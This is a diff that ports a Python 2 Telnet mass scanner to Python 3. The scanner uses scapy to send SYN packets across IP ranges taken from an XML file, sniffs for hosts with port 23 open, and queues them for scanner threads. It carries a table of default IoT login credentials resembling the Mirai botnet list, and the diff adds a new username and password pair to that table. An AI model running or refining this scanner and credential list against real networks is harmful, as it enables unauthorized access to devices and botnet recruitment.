@@ -37,8 +37,7 @@ class PriorityQueue:
         return heapq.heappop(self._queue)[-1]
 
 #this should be a dict
-auth_table = [("user","password",10),("tech","tech",1),("root","Zte521",2),("root","xc3511",2),("root","vizxv",1),("admin","admin",1),("root","admin",1),("root","888888",1),("root","xmhdipc",1),("root","juantech",1),("root","123456",1),("root","54321",1),("support","support",1),("root","",1),("admin","password",1),("root","root",1),("root","root",1),("user","user",1),("admin","admin1234",1),("admin","smcadmin",1),("root","klv123",1),("root","klv1234",1),("root","hi3518",1),("root","jvbzd",1),("root","anko",1),("root","zlxx.",1),("root","system",1)]
-
+auth_table = [("syk","123456",10),("user","password",10),("tech","tech",1),("root","Zte521",2),("root","xc3511",2),("root","vizxv",1),("admin","admin",1),("root","admin",1),("root","888888",1),("root","xmhdipc",1),("root","juantech",1),("root","123456",1),("root","54321",1),("support","support",1),("root","",1),("admin","password",1),("root","root",1),("root","root",1),("user","user",1),("admin","admin1234",1),("admin","smcadmin",1),("root","klv123",1),("root","klv1234",1),("root","hi3518",1),("root","jvbzd",1),("root","anko",1),("root","zlxx.",1),("root","system",1)]
 auth_queue = PriorityQueue()
 for item in auth_table:
     auth_queue.push(item[0:2],item[-1])
@@ -64,7 +63,7 @@ def read_ip(file_xml):
     root = tree.getroot()
     ip_pair = [child.text.strip().split('-') for child in root]
     for x in ip_pair:
-        ip_map.append(xrange(ip2num(x[0]),ip2num(x[1]) + 1))
+        ip_map.append(range(ip2num(x[0]),ip2num(x[1]) + 1))
 #    return [num2ip(item) for pair in ip_map[0:10] for item in pair] 
     return ip_map
 
@@ -77,12 +76,12 @@ def choose_ip(ip_pair):
 def controlP():
     '''Init threads'''
     scanner_list = []
-    start_time = datetime.now()
+    start_time = datetime.datetime.now()
     spewer_thread = spewer("ip.xml")
     try:
        spewer_thread.start()
     except:
-       print "[Error] Start spewer faild!"
+       print ("[Error] Start spewer faild!")
        sys.exit()
              
     sniffer_thread = sniffer()
@@ -90,7 +89,7 @@ def controlP():
         sniffer_thread.daemon = True
         sniffer_thread.start()
     except:
-       print "[Error] Start sniffer faild!"
+       print ("[Error] Start sniffer faild!")
        sys.exit()
 
     for i in range(int(sys.argv[1])):
@@ -108,9 +107,9 @@ def controlP():
         if time.time() - lastRecv > 30 and exitFlag == 1:
             exitFlag = 2
         elif exitFlag == 3:
-            end_time = datetime.now()
-            print "scanner mission completes..."
-            print "It totally costs: %d seconds..." % (end_time - start_time).seconds
+            end_time = datetime.datetime.now()
+            print ("scanner mission completes...")
+            print ("It totally costs: %d seconds..." % (end_time - start_time).seconds)
             break
     
     sys.exit(1)
@@ -119,9 +118,10 @@ def cook(pkt):
     try:
         global lastRecv
         lastRecv = time.time()
+        #print ("pkt[TCP].flags: %s " % pkt[TCP].flags)
         if pkt[TCP].flags == 18 and pkt[IP].src not in ip_prompt_queue:
             queue.put(pkt[IP].src)
-            print "23 port opened: %s " % (pkt[IP].src)
+            print ("23 port opened: %s " % (pkt[IP].src))
             #print pkt[IP].dst
             ip_prompt_queue.append(pkt[IP].src)
     except:
@@ -133,7 +133,7 @@ class sniffer(threading.Thread):
         threading.Thread.__init__(self)
 
     def run(self):
-        print "Start to sniffing..."
+        print ("Start to sniffing...")
         sniff(filter="tcp and dst port 2222 and src port 23",prn=cook)
 
 
@@ -145,11 +145,12 @@ class spewer(threading.Thread):
 
     def run(self):
         global exitFlag
-        print "Start to spewing..."
+        print ("Start to spewing...")
         pkt = IP()/TCP(sport=2222,dport=[23],flags="S")
         for pair in self.ip_pair:
             for ip in pair:
                 pkt[IP].dst = num2ip(ip)
+                #print ("pkt[IP].dst=%s" % pkt[IP].dst)
                 try:
                     send(pkt,verbose=0)
                 except:
@@ -163,7 +164,7 @@ class Scanner(threading.Thread):
         self.queue = queue
 
     def run(self):
-        print "Starting scanner threading..."
+        #print ("Starting scanner threading...")
         while True:
             ip_port = None
             queueLocker.acquire()
@@ -198,7 +199,7 @@ class Scanner(threading.Thread):
                 
 if __name__ == "__main__": 
     if len(sys.argv) != 2:
-        print "usage: scanner.py thread_number"
-        print "example: scanner.py 20"
+        print ("usage: scanner.py thread_number")
+        print ("example: scanner.py 20")
         sys.exit(1)
     controlP()
